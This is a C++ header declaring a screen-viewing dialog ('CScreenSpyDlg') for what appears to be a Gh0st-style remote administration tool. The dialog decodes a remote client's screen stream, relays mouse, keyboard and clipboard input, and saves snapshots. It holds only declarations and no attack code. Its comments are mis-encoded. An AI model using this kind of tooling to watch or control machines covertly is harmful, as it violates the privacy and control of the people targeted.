#pragma once
#include "IOCPServer.h"
#include "..\..\client\CursorInfo.h"

extern "C"
{
#include "libavcodec\avcodec.h"
#include "libavutil\avutil.h"
#include "libyuv\libyuv.h"
}

#ifndef _WIN64
// https://github.com/Terodee/FFMpeg-windows-static-build/releases
#pragma comment(lib,"libavcodec.lib")
#pragma comment(lib,"libavutil.lib")
#pragma comment(lib,"libswresample.lib")

#pragma comment(lib,"libyuv/libyuv.lib")
#else
// ȱ��`FFMPEG`��̬�⣬��ʱ�޷�����64λ����!
#endif

#pragma comment(lib, "Mfplat.lib")
#pragma comment(lib, "Mfuuid.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Strmiids.lib")

// CScreenSpyDlg �Ի���

class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer=NULL, CONTEXT_OBJECT *ContextObject=NULL);   
	virtual ~CScreenSpyDlg();

	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer*     m_iocpServer;

	VOID SendNext(void);
	VOID OnReceiveComplete();
	HDC  m_hFullDC;        
	HDC  m_hFullMemDC;
	HBITMAP	m_BitmapHandle;
	PVOID   m_BitmapData_Full;
	LPBITMAPINFO m_BitmapInfor_Full;
	VOID DrawFirstScreen(void);
	VOID DrawNextScreenDiff(bool keyFrame);
	BOOL         m_bIsFirst;
	ULONG m_ulHScrollPos;
	ULONG m_ulVScrollPos;
	VOID DrawTipString(CString strString);

	HICON  m_hIcon;
	HICON  m_hCursor;
	POINT  m_ClientCursorPos;
	BYTE m_bCursorIndex;
	CString  m_strClientIP;
	BOOL     m_bIsTraceCursor;
	CCursorInfo	m_CursorInfo; //�Զ����һ��ϵͳ�Ĺ����
	VOID SendCommand(const MSG64* Msg);

	VOID UpdateServerClipboard(char *szBuffer,ULONG ulLength);
	VOID SendServerClipboard(void);

	BOOL  m_bIsCtrl;
	LPBYTE m_szData;
	BOOL  m_bSend;
	ULONG m_ulMsgCount;
	int m_FrameID;

	BOOL SaveSnapshot(void);
	// �Ի�������
	enum { IDD = IDD_DIALOG_SCREEN_SPY };

	BOOL m_bFullScreen;

	WINDOWPLACEMENT m_struOldWndpl;

#ifndef _WIN64
	AVCodec*			m_pCodec;
	AVCodecContext*		m_pCodecContext;
	AVPacket			m_AVPacket;
	AVFrame				m_AVFrame;
#endif

	bool Decode(LPBYTE Buffer, int size);
	void EnterFullScreen();
	bool LeaveFullScreen();

	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnLButtonDown(UINT nFlags, CPoint point);
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	afx_msg BOOL OnMouseWheel(UINT nFlags, short zDelta, CPoint pt);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
	afx_msg void OnKillFocus(CWnd* pNewWnd);
	afx_msg void OnSize(UINT nType, int cx, int cy);

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnPaint();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
};
